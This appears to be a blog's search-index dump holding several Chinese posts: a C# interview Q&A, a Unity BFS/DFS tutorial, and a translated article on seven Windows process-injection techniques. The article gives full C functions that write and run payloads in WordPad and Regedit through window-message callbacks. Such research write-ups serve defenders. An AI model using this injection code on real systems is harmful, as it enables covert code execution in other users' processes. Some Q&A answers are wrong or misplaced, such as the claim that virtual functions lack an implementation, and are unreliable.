以a+&#x3D;5 时，值是 425.const和readonly有什么区别？都可以标识一个常量。主要有以下区别：1 、初始化位置不同。 const 必须在声明的同时赋值； readonly 即可以在声明处赋值 ;2 、修饰对象不同。 const 即可以修饰类的字段，也可以修饰局部变量； readonly 只能修饰类的字段3 、 const 是编译时常量，在编译时确定该值； readonly 是运行时常量，在运行时确定该值。4 、 const 默认是静态的；而 readonly 如果设置成静态需要显示声明5 、修饰引用类型时不同， const 只能修饰 string 或值为 null 的其他引用类型； readonly 可以是任何类型。26.分析下面代码，a、b的值是多少？分析：一个字母、数字占一个 byte ，一个中文占占两个 byte ，所以 a&#x3D;8,b&#x3D;527.Strings &#x3D; new String(“xyz”);创建了几个String Object?两个对象，一个是 “xyz”, 一个是指向 “xyz” 的引用对象 s 。28.c#可否对内存直接操作C# 在 unsafe 模式下可以使用指针对内存进行操作 , 但在托管模式下不可以使用指针， C#NET 默认不运行带指针的，需要设置下，选择项目右键-&gt; 属性 -&gt; 选择生成 -&gt;“ 允许不安全代码 ” 打勾 -&gt; 保存29.什么是强类型，什么是弱类型？哪种更好些？为什么?强类型是在编译的时候就确定类型的数据，在执行时类型不能更改，而弱类型在执行的时候才会确定类 型。没有好不好，二者各有好处，强类型安全，因为它事先已经确定好了，而且效率高。一般用于编译 型编程语言，如c++,java,c#,pascal等 , 弱类型相比而言不安全，在运行的时候容易出现错误，但它灵活， 多用于解释型编程语言，如javascript 等30.Math.Round(11.5)等於多少? Math.Round(-11.5)等於多少?Math.Round(11.5)&#x3D;12Math.Round(-11.5)&#x3D;-1231.&amp;和&amp;&amp;的区别相同点 &amp;和 &amp;&amp; 都可作逻辑与的运算符，表示逻辑与（ and ），当运算符两边的表达式的结果都为 true 时，其结 果才为true ，否则，只要有一方为 false ，则结果为 false 。（ ps ：当要用到逻辑与的时候 &amp; 是毫无意义， &amp;本身就不是干这个的）string strTmp &#x3D; “a1某某某 “;int a &#x3D; System.Text.Encoding.Default.GetBytes(strTmp).Length;int b &#x3D; strTmp.Length; 不同点if(loginUser!&#x3D;null&amp;&amp;string.IsnullOrEmpty(loginUser.UserName))&amp;&amp; 具有短路的功能，即如果第一个表达式为 false ，则不再计算第二个表达式，对于上面的表达式，当loginUser为 null 时，后面的表达式不会执行，所以不会出现 NullPointerException 如果将 &amp;&amp; 改为 &amp; ，则 会抛出NullPointerException 异常。（ ps ：所以说当要用到逻辑与的时候 &amp; 是毫无意义的） &amp; 是用作位运算的。 总结 &amp;是位运算，返回结果是 int 类型 &amp;&amp; 是逻辑运算，返回结果是 bool 类型32.i++和++i有什么区别？1.i++ 是先赋值，然后再自增； ++i 是先自增，后赋值。2.i&#x3D;0 ， i++&#x3D;0 ， ++i&#x3D;1 ； Console.WriteLine(++i&#x3D;&#x3D;i++); 结果位 true33.as和is的区别as 在转换的同时判断兼容性，如果无法进行转换，返回位 null （没有产生新的对象）， as 转换是否成功判断的依据是是否位 null is 只是做类型兼容性判断，并不执行真正的类型转换，返回 true 或 false ，对象为 null 也会返回 false 。as 比 is 效率更高， as 只需要做一次类型兼容检查34.谈谈final、finally的区别。final ：不能作为父类被继承。一个类不能声明是 final ，又声明为 abstract 。finally ：用于 try{}catch{}finally{} 结构，用于异常处理时执行任何清除操作。35.简述C#成员修饰符abstract: 指示该方法或属性没有实现。const: 指定域或局部变量的值不能被改动。event: 声明一个事件。extern: 指示方法在外部实现。override: 对由基类继承成员的新实现。readonly: 指示一个域只能在声明时以及相同类的内部被赋值。static: 指示一个成员属于类型本身 , 而不是属于特定的对象。virtual: 指示一个方法或存取器的实现可以在继承类中被覆盖。36.什么是匿名类，有什么好处？不用定义、没有名字的类，使用一次便可丢弃。好处是简单、随意、临时的。37.说说什么是逐字字符串38.列举你知道的数字格式化转换39.说说字符串拼接、字符串内插法40.什么是虚函数？什么是抽象函数？虚函数：没有实现的，可以由子类继承并重写的函数。抽象函数：规定其非虚子类必须实现的函数，必须被重写。41.什么是WebService?答： Web Service 是基于网络的、分布式的模块化组件，它执行特定的任务，遵守具体的技术规范，这些规范使得Web Service 能与其他兼容的组件进行互操作。42.ADO.NET常用对象有哪些？Connection ： 主要是开启程序和数据库之间的连接。没有利用连接对象将数据库打开，是无法从数据 库中取得数据的。Close 和 Dispose 的区别， Close 以后还可以 Open ， Dispose 以后则不能再用。Command ： 主要可以用来对数据库发出一些指令，例如可以对数据库下达查询、新增、修改、删除数据等指令，以及调用存在数据库中的存储过程等。这个对象是架构在 Connection 对象上，也就是Command ： 对象是通过在 Connection 对象连接到数据源。DataAdapter ： 主要是在数据源以及 DataSet 之间执行数据传输的工作，它可以透过 Command 对象下 达命令后，并将取得的数据放入DataSet 对象中。这个对象是架构在 Command 对象上，并提供了许多 配合DataSet 使用的功能。DataSet ： 这个对象可以视为一个暂存区（ Cache ），可以把从数据库中所查询到的数据保留起来甚至可以将整个数据库显示出来，DataSet 是放在内存中的。 DataSet 的能力不只是可以储存多个 Table 而已，还可以透过DataAdapter 对象取得一些例如主键等的数据表结构，并可以记录数据表间的关联。 DataSet 对象可以说是 ADO.NET 中重量级的对象，这个对象架构在 DataAdapter 对象上，本身不具备和 数据源沟通的能力；也就是说我们是将DataAdapter 对象当做 DataSet 对象以及数据源间传输数据的桥 梁。DataSet 包含若干 DataTable 、 DataTableTable 包含若干 DataRow 。DataReader ： 当我们只需要循序的读取数据而不需要其它操作时，可以使用 DataReader 对象。DataReader 对象只是一次一次向下循序的读取数据源中的数据，这些数据是存在数据库服务器中的，而 不是一次性加载到程序的内存中的，只能（通过游标）读取当前行的数据，而且这些数据是只读的，并不允许作其它的操作。因为DataReader 在读取数据的时候限制了每次只读取一条，而且只能只读，所以使用起来不但节省资源而且效率很好。使用DataReader 对象除了效率较好之外，因为不用把数据全 部传回，故可以降低网络的负载。43.在ASP.NET中所有的自定义用户控件都必须继承自？Control 类44.在.NET托管代码总我们不必担心内存泄漏，这是因为有了？GC 垃圾收集器。45.什么是MVC模式MVC(Model View Controller) 模型－视图－控制器aspx 就是 View ，视图； Model ： DataSet 、 Reader 、对象； Controller ： cs 代码。MVC 是典型的平行关系，没有说谁在上谁在下的关系，模型负责业务领域的事情，视图负责显示的事情，控制器把数据读取出来填充模型后把模型交给视图去处理。而各种验证什么的应该是在模型里处理了。它强制性的使应用程序的输入、处理和输出分开。 MVC 最大的好处是将逻辑和页面分离。 46. 能用 foreach 遍历访问的对象的要求需要实现 IEnumerable 接口或声明 GetEnumerator 方法的类型。47.什么是反射?程序集包含模块，而模块又包括类型，类型下有成员，反射就是管理程序集，模块，类型的对象，它能够动态的创建类型的实例，设置现有对象的类型或者获取现有对象的类型，能调用类型的方法和访问类型的字段属性。它是在运行时创建和使用类型实例。48.ORM中的延迟加载与直接加载有什么异同？延迟加载（ Lazy Loading ）只在真正需要进行数据操作的时候再进行加载数据，可以减少不必要的开销。49.简述Func与Action的区别？Func 是有返回值的委托， Action 是没有返回值的委托。50.23种设计模式分别叫什么名称，如何分类？分三类：创建型，行为型，结构型；创建型包含：\n\n单例模式\n\n工厂模式\n\n建造者模式\n\n原型模式\n\n工厂方法模式  行为型包含：\n\n策略模式\n\n模板方法模式\n\n观察者模式\n\n迭代子模式\n\n责任链模式\n\n命令模式\n\n备忘录模式\n\n状态模式\n\n访问者模式\n\n中介者模式\n\n解释器模式结构型设计模式包含：\n\n适配器模式\n\n装饰器模式\n\n代理模式\n\n外观模式\n\n桥接模式\n\n组合模式\n\n享元模式\n\n\n参考   https://blog.csdn.net/bt5190/article/details/118144811 \n","categories":["language"],"tags":["csharp"]},{"title":"BFS and DFS","url":"/2022/11/03/dev/code/dfs_bfs/","content":"BFS广度优先遍历和DFS深度优先遍历广度优先搜索(Breadth First Search，简称BFS)\n假设从A节点出发，在访问了该节点之后依次访问这个节点各个未曾访问过的邻接点，然后分别从这些邻接点出发依次访问它们的邻接点。重复此步骤，直到所有的节点都被访问完为止。\n如上图，广度优先搜索的顺序是：ABCDEFG\n深度优先搜索(Depth First Search，简称DFS)\n假设从A节点出发，首先访问该节点，然后依次从它的各个未被访问的邻接点出发，访问邻接点的邻接点。重复此步骤，直到所有的节点都被访问完为止。\n如上图，深度优先搜索的顺序是：ABDECFG\n实战现在以一个实际的例子用C#代码来实现，下面是Unity中的一个Hierarchy层级图，根节点是Root，下面有GameObject，GameObject (1)， GameObject (2)三个节点，其中GameObject (1)下又有GameObject_A和GameObject_B两个节点：\n\nusing System.Collections.Generic;using UnityEngine;public class DM06Composite : MonoBehaviour&#123;    void Start()    &#123;        DMComposite root = new DMComposite(&quot;Root&quot;);        // 添加Root下的三个节点        DMLeaf leaf1 = new DMLeaf(&quot;GameObject&quot;);        DMLeaf leaf2 = new DMLeaf(&quot;GameObject (2)&quot;);        DMComposite gameObject1 = new DMComposite(&quot;GameObject (1)&quot;);        root.AddChild(leaf1);        root.AddChild(gameObject1);        root.AddChild(leaf2);                // 添加GameObject (1)下面的两个节点        DMLeaf child1 = new DMLeaf(&quot;GameObject_A&quot;);        DMLeaf child2 = new DMLeaf(&quot;GameObject_B&quot;);        gameObject1.AddChild(child1);        gameObject1.AddChild(child2);        // 按照广度优先或深度优先输出节点顺序        //DepthFirstSearch(root);        BreadthFirstSearch(root);    &#125;    // 广度优先检索    private void BreadthFirstSearch(DMComponent component)    &#123;        Queue&lt;DMComponent&gt; q = new Queue&lt;DMComponent&gt;();        q.Enqueue(component);        // 打印节点名字        Debug.Log(component.Name);        while (q.Count &gt; 0)        &#123;            DMComponent temp = q.Dequeue();            List&lt;DMComponent&gt; children = temp.Children;            foreach (DMComponent child in children)            &#123;                // 打印节点名字                Debug.Log(child.Name);                q.Enqueue(child);            &#125;        &#125;    &#125;    // 深度优先检索    private void DepthFirstSearch(DMComponent component)    &#123;        // 打印节点名字        Debug.Log(component.Name);        List&lt;DMComponent&gt; children = component.Children;        if (children == null || children.Count == 0) return;        foreach (DMComponent child in children)        &#123;            DepthFirstSearch(child);        &#125;    &#125;&#125;// 抽象组件类public abstract class DMComponent&#123;    protected string mName;    public string Name &#123; get &#123; return mName; &#125; &#125;    public DMComponent(string name)    &#123;        mName = name;        mChildren = new List&lt;DMComponent&gt;();    &#125;    protected List&lt;DMComponent&gt; mChildren;    public List&lt;DMComponent&gt; Children &#123; get &#123; return mChildren; &#125; &#125;    public abstract void AddChild(DMComponent c);    public abstract void RemoveChild(DMComponent c);    public abstract DMComponent GetChild(int index);&#125;// 叶子类，一棵树当中没有子节点的节点public class DMLeaf : DMComponent&#123;    public DMLeaf(string name) : base(name) &#123; &#125;    public override void AddChild(DMComponent c)    &#123;        return;    &#125;    public override void RemoveChild(DMComponent c)    &#123;        return;    &#125;    public override DMComponent GetChild(int index)    &#123;        return null;    &#125;&#125;// 容器类，可以有子节点public class DMComposite : DMComponent&#123;    public DMComposite(string name) : base(name) &#123; &#125;    public override void AddChild(DMComponent c)    &#123;        mChildren.Add(c);    &#125;    public override void RemoveChild(DMComponent c)    &#123;        mChildren.Remove(c);    &#125;    public override DMComponent GetChild(int index)    &#123;        return mChildren[index];    &#125;&#125; \n\n广度优先搜索：\n\n深度优先搜索：\n\n解析\n上面的代码稍微有点复杂，下面详细的解释一下，首先，使用设计模式中的组合模式：组合多个对象形成树形结构，以表示具有“整体-部分”关系的层次结构。组合模式对单个对象（即叶子对象）和组合对象（即容器对象）的使用具有一致性。\n抽象组件类（Component）：它可以是接口或抽象类，为叶子组件和容器组件对象声明接口，在该角色中可以包含所有子类共有行为的声明和实现。在抽象组件类中，定义了访问及管理它的子组件的方法；\n叶子类（Leaf）：在组合模式中，表示叶子节点对象，叶子节点没有子节点，实现了在抽象组件类中定义的行为。\n容器类（Composite）：在组合模式中，表示容器节点对象，容器节点包含子节点，其子节点可以叶子节点，也可以是容器节点，提供了一个集合用于存储子节点，实现了在抽象组件类中定义的行为，包括访问及管理子组件的方法。\n使用组合模式的目的是为了组装上面的层次结构，建立好层次结构后，就可以进行检索了。\n广度优先搜索实现的核心思想：\n\n建立一个队列Queue，利用它的先进先出原则，把根节点放入队列中，在一个while循环中，检索根节点的所有子节点，把根节点从队列中移除，然后把子节点放入队列中，检索子节点的所有子节点，依次循环执行。\n\n深度优先搜索实现的核心思想：\n\n首先遍历根节点的所有子节点，然后使用递归，依次遍历子节点下面的子节点。\n\nref:\nhttps://zhuanlan.zhihu.com/p/349093576\n","categories":["algorithm"],"tags":["csharp"]},{"title":"Windows进程注入的7中方法","url":"/2022/11/02/security/reverse/Windows%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5%E7%9A%847%E4%B8%AD%E6%96%B9%E6%B3%95/","content":"Windows进程注入的7中方法简介在本文中，我们将具体讨论这些新型注入方法，并提供一些可用的示例。前五种方法的示例都将使用“Edit”和“Rich Edit”控件，最后两个则使用SysListView32和SysTreeView32。\n关于Rich Edit控件要进行新型注入方法的尝试，我们可以选择遍历所有窗口，例如EnumWindows，从窗口句柄中检索类的名称，然后将字符串的开始部分与“RICHEDIT”进行比较。除了这种方法之外，我们还可以使用FindWindow或FindWindowEX手动查找这些空间。我们所使用的环境是Windows 10的评估版本，因此我进行测试时使用的唯一应用程序就是Wordpad（写字板），并找到其中的富文本控件Rich Edit Control。要完成这一过程，只需要两行代码。\n\\1. 获取Wordpad的主窗口\nwpw = FindWindow(L&quot;WordPadClass&quot;, NULL);\n\n\\2. 找到Rich Edit控件\nrew = FindWindowEx(wpw, NULL, L&quot;RICHEDIT50W&quot;, NULL);\n\n方法1：WordWarping可以使用EM_SETWORDBREAKPROC消息来设置Edit或Rich Edit空间的文本包装器回调函数。通过SendInput或PostMessage API模拟键盘输入，可以触发回调函数的执行。这种注入方式在16年前就已经被用于在应用程序中提升特权。尽管没有针对该漏洞的CVE编号，但实际上，它可以被用于针对McAfee、VirusScan、Sygate Personal Firewall Pro、WinVNC、Dameware以及其他产品的漏洞利用。示例中的代码，就使用了WordPad实现注入代码，其具体步骤如下：\n\\1. 获取Wordpad的主窗口；\n\\2. 找到Wordpad的Rich Edit控件；\n\\3. 尝试获取Wordwrap函数的当前地址；\n\\4. 获取Wordpad的进程ID；\n\\5. 尝试打开该进程；\n\\6. 为Payload分配RWX内存；\n\\7. 将Payload写入内存；\n\\8. 更新回调过程；\n\\9. 模拟键盘输入，以触发Payload；\n\\10. 恢复原始Wordwrap功能（如果存在）；\n\\11. 释放内存并关闭进程句柄。\nVOID wordwarping(LPVOID payload, DWORD payloadSize) &#123;    HANDLE        hp;    DWORD         id;    HWND          wpw, rew;    LPVOID        cs, wwf;    SIZE_T        rd, wr;    INPUT         ip;       // 1. Get main window for wordpad.    //    This will accept simulated keyboard input.    wpw = FindWindow(L&quot;WordPadClass&quot;, NULL);       // 2. Find the rich edit control for wordpad.    rew = FindWindowEx(wpw, NULL, L&quot;RICHEDIT50W&quot;, NULL);     // 3. Try get current address of Wordwrap function    wwf = (LPVOID)SendMessage(rew, EM_GETWORDBREAKPROC, 0, 0);     // 4. Obtain the process id for wordpad.    GetWindowThreadProcessId(rew, &amp;id);     // 5. Try open the process.    hp = OpenProcess(PROCESS_ALL_ACCESS, FALSE, id);     // 6. Allocate RWX memory for the payload.    cs = VirtualAllocEx(hp, NULL, payloadSize,        MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);     // 7. Write the payload to memory    WriteProcessMemory(hp, cs, payload, payloadSize, &amp;wr);     // 8. Update the callback procedure    SendMessage(rew, EM_SETWORDBREAKPROC, 0, (LPARAM)cs);     // 9. Simulate keyboard input to trigger payload    ip.type           = INPUT_KEYBOARD;    ip.ki.wVk         = &#x27;A&#x27;;    ip.ki.wScan       = 0;    ip.ki.dwFlags     = 0;    ip.ki.time        = 0;    ip.ki.dwExtraInfo = 0;       SetForegroundWindow(rew);    SendInput(1, &amp;ip, sizeof(ip));     // 10. Restore original Wordwrap function (if any)    SendMessage(rew, EM_SETWORDBREAKPROC, 0, (LPARAM)wwf);       // 11. Free memory and close process handle    VirtualFreeEx(hp, cs, 0, MEM_DECOMMIT | MEM_RELEASE);    CloseHandle(hp);&#125;\n\n方法2：Hyphentensiontypedef struct tagHyphenateInfo &#123;  SHORT cbSize;  SHORT dxHyphenateZone;  void((WCHAR *,LANGID, long,HYPHRESULT *) * )pfnHyphenate;&#125; HYPHENATEINFO;\n\n可以通过发送带有指向HYPHENATEINFO结构的指针的EM_GETHYPHENATEINFO消息，来获取有关Rich Edit空间Hyphenation信息。但是，该方法假定指向结构的指针是本地内存，因此攻击者必须在使用SendMessage或PostMessage发送EM_GETHYPHENATEINFO之前，借助VirtualAllocEx为信息分配内存。在使用EM_SETHYPHENATEINFO之前，可能需要设置Edit空间的排版（Typography）选项。尽管我们无法使用写字板实现这一点，但我们推测，诸如Microsoft Word这样功能丰富的文字处理器应该是可行的。\n方法3：AutoCourgette根据MSDN上提供的信息，EM_SETAUTOCORRECTPROC消息所支持的客户端最低版本是Windows 8，因此它是一个相对较新的功能。写字板显然不支持自动校正，所以我无法实现该方法的利用。像第二种方法Hyphenation一样，这种方法可能会适用于Microsoft Word。\n方法4：Streamceptiontypedef struct _editstream &#123;  DWORD_PTR          dwCookie;  DWORD              dwError;  EDITSTREAMCALLBACK pfnCallback;&#125; EDITSTREAM;\n\n当Rich Edit空间收到EM_STREAMIN消息时，它使用EDITSTREAM结构中提供的信息，将数据流传入或传出控件。pfnCallback字段的类型为EDITSTREAMCALLBACK，可以指向内存中的Payload。我们确保EDITSTREAMCALLBACK会返回一个非零值，从而指示错误的存在，但最终，Rich Edit空间中的内容仍然会被删除。这一方法可以正常工作，但不会破坏现有的缓冲流。我们推测，可能有方法能够解决这一问题，但目前我们仍然在深入调查的过程中。\n该方法的具体步骤如下：\n\\1. 获取窗口句柄；\n\\2. 获取进程ID并尝试打开进程；\n\\3. 分配RWX内存，并在该位置复制Payload；\n\\4. 分配RW内存，并在该位置复制EDITSTREAM结构；\n\\5. 使用EM_STREAMIN触发Payload；\n\\6. 释放内存并关闭进程句柄。\nVOID streamception(LPVOID payload, DWORD payloadSize) &#123;    HANDLE        hp;    DWORD         id;    HWND          wpw, rew;    LPVOID        cs, ds;    SIZE_T        rd, wr;    EDITSTREAM    es;       // 1. Get window handles    wpw = FindWindow(L&quot;WordPadClass&quot;, NULL);    rew = FindWindowEx(wpw, NULL, L&quot;RICHEDIT50W&quot;, NULL);       // 2. Obtain the process id and try to open process    GetWindowThreadProcessId(rew, &amp;id);    hp = OpenProcess(PROCESS_ALL_ACCESS, FALSE, id);     // 3. Allocate RWX memory and copy the payload there.    cs = VirtualAllocEx(hp, NULL, payloadSize,        MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);     WriteProcessMemory(hp, cs, payload, payloadSize, &amp;wr);     // 4. Allocate RW memory and copy the EDITSTREAM structure there.    ds = VirtualAllocEx(hp, NULL, sizeof(EDITSTREAM),        MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);           es.dwCookie    = 0;    es.dwError     = 0;    es.pfnCallback = cs;       WriteProcessMemory(hp, ds, &amp;es, sizeof(EDITSTREAM), &amp;wr);       // 5. Trigger payload with EM_STREAMIN    SendMessage(rew, EM_STREAMIN, SF_TEXT, (LPARAM)ds);     // 6. Free memory and close process handle    VirtualFreeEx(hp, ds, 0, MEM_DECOMMIT | MEM_RELEASE);    VirtualFreeEx(hp, cs, 0, MEM_DECOMMIT | MEM_RELEASE);    CloseHandle(hp);&#125;\n\n方法5：Oleum在完成前四个方法的研究之后，我开始研究EM_SETOLECALLBACK这个潜在的方法。大概是在同一时间，Adam也更新了他的博客，说发现了这一方法。EM_GETOLECALLBACK消息似乎没有很好地进行记录，如果LPARAM没有指向本地可访问的内存，当发送到带有SendMessage的Rich Edit窗口时，将会发生崩溃。此外，EM_GETOLECALLBACK没有按预期返回指向IRichEditOleCallback的指针，它返回了一个指向IRichEditOle的指针。因此，我没有使用EM_SETOLECALLBACK。相反，保存IRichEditOle.lpVtbl的堆内存将被一个地址覆盖到原始表的副本，其中一个方法指向Payload，在我们的示例中具体是GetClipboardData。\n由于虚拟函数表仅位于只读内存中，所以我们无法实现对它的覆盖。也许有读者会说，可以在更改内存保护后实现对其的覆盖，但我并不推荐这种方法。我们可以制作副本，更新一个条目，并简单地重定向执行，这样可能会更有意义。\ntypedef struct _IRichEditOle_t &#123;    ULONG_PTR QueryInterface;    ULONG_PTR AddRef;    ULONG_PTR Release;    ULONG_PTR GetClientSite;    ULONG_PTR GetObjectCount;    ULONG_PTR GetLinkCount;    ULONG_PTR GetObject;    ULONG_PTR InsertObject;    ULONG_PTR ConvertObject;    ULONG_PTR ActivateAs;    ULONG_PTR SetHostNames;    ULONG_PTR SetLinkAvailable;    ULONG_PTR SetDvaspect;    ULONG_PTR HandsOffStorage;    ULONG_PTR SaveCompleted;    ULONG_PTR InPlaceDeactivate;    ULONG_PTR ContextSensitiveHelp;    ULONG_PTR GetClipboardData;    ULONG_PTR ImportDataObject;&#125; _IRichEditOle;\n\n下面的代码中，使用WordPad作为示例，因为我在使用EM_SETOLECALLBACK消息的Windows的评估版本上找不到任何其他可以使用的应用程序。该过程会将Payload的地址替换为GetClipboardData的地址，然后将WM_COPY发送到Rich Edit窗口。\n具体步骤如下：\n\\1. 获取窗口句柄；\n\\2. 获取进程ID并尝试打开进程；\n\\3. 分配RWX内存，并在该位置复制Payload；\n\\4. 为当前地址分配RW内存；\n\\5. 查询界面；\n\\6. 读取内存地址；\n\\7. 读取IRichEditOle.lpVtbl；\n\\8. 读取虚拟函数表；\n\\9. 为虚拟函数表的副本分配内存；\n\\10. 将GetClipboardData方法设置为Payload的地址；\n\\11. 将新的虚拟函数表写入远程内存；\n\\12. 更新IRichEditOle.lpVtbl；\n\\13. 通过调用GetClipboardData方法触发Payload；\n\\14. 恢复IRichEditOle.lpVtbl的原始值；\n\\15. 释放内存并关闭进程句柄。\nVOID oleum(LPVOID payload, DWORD payloadSize) &#123;    HANDLE                hp;    DWORD                 id;    HWND                  rew;    LPVOID                cs, ds, ptr, mem, tbl;    SIZE_T                rd, wr;    _IRichEditOle         reo;       // 1. Get the window handle    rew = FindWindow(L&quot;WordPadClass&quot;, NULL);    rew = FindWindowEx(rew, NULL, L&quot;RICHEDIT50W&quot;, NULL);       // 2. Obtain the process id and try to open process    GetWindowThreadProcessId(rew, &amp;id);    hp = OpenProcess(PROCESS_ALL_ACCESS, FALSE, id);     // 3. Allocate RWX memory and copy the payload there    cs = VirtualAllocEx(hp, NULL, payloadSize,      MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);         WriteProcessMemory(hp, cs, payload, payloadSize, &amp;wr);       // 4. Allocate RW memory for the current address    ptr = VirtualAllocEx(hp, NULL, sizeof(ULONG_PTR),      MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);         // 5. Query the interface    SendMessage(rew, EM_GETOLEINTERFACE, 0, (LPARAM)ptr);       // 6. Read the memory address    ReadProcessMemory(hp, ptr, &amp;mem, sizeof(ULONG_PTR), &amp;wr);     // 7. Read IRichEditOle.lpVtbl    ReadProcessMemory(hp, mem, &amp;tbl, sizeof(ULONG_PTR), &amp;wr);     // 8. Read virtual function table    ReadProcessMemory(hp, tbl, &amp;reo, sizeof(_IRichEditOle), &amp;wr);     // 9. Allocate memory for copy of virtual table    ds = VirtualAllocEx(hp, NULL, sizeof(_IRichEditOle),      MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);         // 10. Set the GetClipboardData method to address of payload    reo.GetClipboardData = (ULONG_PTR)cs;       // 11. Write new virtual function table to remote memory    WriteProcessMemory(hp, ds, &amp;reo, sizeof(_IRichEditOle), &amp;wr);       // 12. update IRichEditOle.lpVtbl    WriteProcessMemory(hp, mem, &amp;ds, sizeof(ULONG_PTR), &amp;wr);       // 13. Trigger payload by invoking the GetClipboardData method    PostMessage(rew, WM_COPY, 0, 0);       // 14. Restore original value of IRichEditOle.lpVtbl    WriteProcessMemory(hp, mem, &amp;tbl, sizeof(ULONG_PTR), &amp;wr);       // 15. Free memory and close process handle    VirtualFreeEx(hp, ptr,0, MEM_DECOMMIT | MEM_RELEASE);    VirtualFreeEx(hp, cs, 0, MEM_DECOMMIT | MEM_RELEASE);    VirtualFreeEx(hp, ds, 0, MEM_DECOMMIT | MEM_RELEASE);       CloseHandle(hp);  &#125;\n\n方法6：ListPlanting可以使用LVM_SORTGROUPS、LVM_INSERTGROUPSORTED和LVM_SORTITEMS消息，自定义ListView控件中的项目&#x2F;组。以下结构将用于LVM_INSERTGROUPSORTED。\ntypedef struct tagLVINSERTGROUPSORTED &#123;  PFNLVGROUPCOMPARE pfnGroupCompare;  void              *pvData;  LVGROUP           lvGroup;&#125; LVINSERTGROUPSORTED, *PLVINSERTGROUPSORTED;\n\n下面的代码中，使用注册表编辑器和LVM_SORTITEMS来触发Payload。在这里，存在一个问题，就是这一过程会为列表中的每一项调用回调函数。如果列表中没有项目，那么根本不会调用该函数。实际上，我们可以想办法解决这一问题，例如检查列表中有多少项目、添加项目、删除项目、使用传递给回调函数的参数等。\n具体步骤如下：\n\\1. 获取窗口句柄；\n\\2. 获取进程ID并尝试打开进程；\n\\3. 分配RWX内存并在该位置复制Payload；\n\\4. 触发Payload；\n\\5. 释放内存并关闭进程句柄。\nVOID listplanting(LPVOID payload, DWORD payloadSize) &#123;    HANDLE        hp;    DWORD         id;    HWND          lvm;    LPVOID        cs;    SIZE_T        wr;       // 1. get the window handle    lvm = FindWindow(L&quot;RegEdit_RegEdit&quot;, NULL);    lvm = FindWindowEx(lvm, 0, L&quot;SysListView32&quot;, 0);      // 2. Obtain the process id and try to open process    GetWindowThreadProcessId(lvm, &amp;id);    hp = OpenProcess(PROCESS_ALL_ACCESS, FALSE, id);     // 3. Allocate RWX memory and copy the payload there.    cs = VirtualAllocEx(hp, NULL, payloadSize,        MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);     WriteProcessMemory(hp, cs, payload, payloadSize, &amp;wr);       // 4. Trigger payload    PostMessage(lvm, LVM_SORTITEMS, 0, (LPARAM)cs);       // 5. Free memory and close process handle    VirtualFreeEx(hp, cs, 0, MEM_DECOMMIT | MEM_RELEASE);    CloseHandle(hp);&#125;\n\n方法7：Treepolinetypedef struct tagTVSORTCB &#123;  HTREEITEM    hParent;  PFNTVCOMPARE lpfnCompare;  LPARAM       lParam;&#125; TVSORTCB, *LPTVSORTCB;\n\n可以通过TVM_SORTCHILDRENCB消息实现自定义排序。对于每个项目，将会执行Payload，因此还需要进行额外检查，以避免运行多个实例。在获取TreeListView窗口句柄后，我们需要做的第一件事情是获取根项目。在调用回调函数之前，我们就需要其中的一个项目。\n具体步骤如下：\n\\1. 获取treeview句柄；\n\\2. 获取进程ID并尝试打开进程；\n\\3. 分配RWX内存，并在该位置复制Payload；\n\\4. 获取树列表中的根项目；\n\\5. 分配RW内存，并复制TVSORTCB结构；\n\\6. 触发Payload；\n\\7. 释放内存并关闭进程句柄。\n// requires elevated privilegesVOID treepoline(LPVOID payload, DWORD payloadSize) &#123;    HANDLE        hp;    DWORD         id;    HWND          wpw, tlv;    LPVOID        cs, ds, item;    SIZE_T        rd, wr;    TVSORTCB      tvs;       // 1. get the treeview handle    wpw = FindWindow(L&quot;RegEdit_RegEdit&quot;, NULL);    tlv = FindWindowEx(wpw, 0, L&quot;SysTreeView32&quot;, 0);       // 2. Obtain the process id and try to open process    GetWindowThreadProcessId(tlv, &amp;id);    hp = OpenProcess(PROCESS_ALL_ACCESS, FALSE, id);     // 3. Allocate RWX memory and copy the payload there.    cs = VirtualAllocEx(hp, NULL, payloadSize,        MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);           WriteProcessMemory(hp, cs, payload, payloadSize, &amp;wr);       // 4. Obtain the root item in tree list    item = (LPVOID)SendMessage(tlv, TVM_GETNEXTITEM, TVGN_ROOT, 0);     tvs.hParent     = item;    tvs.lpfnCompare = cs;    tvs.lParam      = 0;       // 5. Allocate RW memory and copy the TVSORTCB structure    ds = VirtualAllocEx(hp, NULL, sizeof(TVSORTCB),        MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);           WriteProcessMemory(hp, ds, &amp;tvs, sizeof(TVSORTCB), &amp;wr);       // 6. Trigger payload    SendMessage(tlv, TVM_SORTCHILDRENCB, 0, (LPARAM)ds);     // 7. Free memory and close process handle    VirtualFreeEx(hp, ds, 0, MEM_DECOMMIT | MEM_RELEASE);    VirtualFreeEx(hp, cs, 0, MEM_DECOMMIT | MEM_RELEASE);       CloseHandle(hp);&#125;\n\nPoChttps://github.com/odzhan/injection/tree/master/richedit\n","categories":["security"],"tags":["reverse"]},{"title":"English","url":"/2022/10/27/english/english/","content":"English词汇听说读写","categories":["english"],"tags":["english"]},{"title":"Easy CS","url":"/2022/10/27/cs/easycs/","content":"Easy CSEasy computer science\n本仓库记录编程语言的知识点学习以及配套相关例子代码，让初学者慢慢跟近脚步，更好的学习相关知识点。仓库会不断更新中。\n知止而后有定，定而后能静，静而后能安，安而后能虑，虑而后能得。物有本末，事有终始，知所先后，则近道矣。\nLinux系统[介绍]\n[Arch Linux安装]\n[linux基本命令]\n[linux配置文件介绍]\n[引导介绍]\n[问题集]\n软件使用[vim]\n[tmux]\n[docker]\n编程语言c[介绍]\n[环境搭建]\n[Hello C Wrold]\n[变量类型]\n[数组]\n[结构体]\n[指针]\n[内存管理]\n[线程]\n[进程]\n[进程通信]\n[信号量]\n[系统调用]\n[嵌入汇编]\n[代码混淆]\n[动态链接库]\nc++代码[介绍]\n[环境搭建]\n[Hello C++ 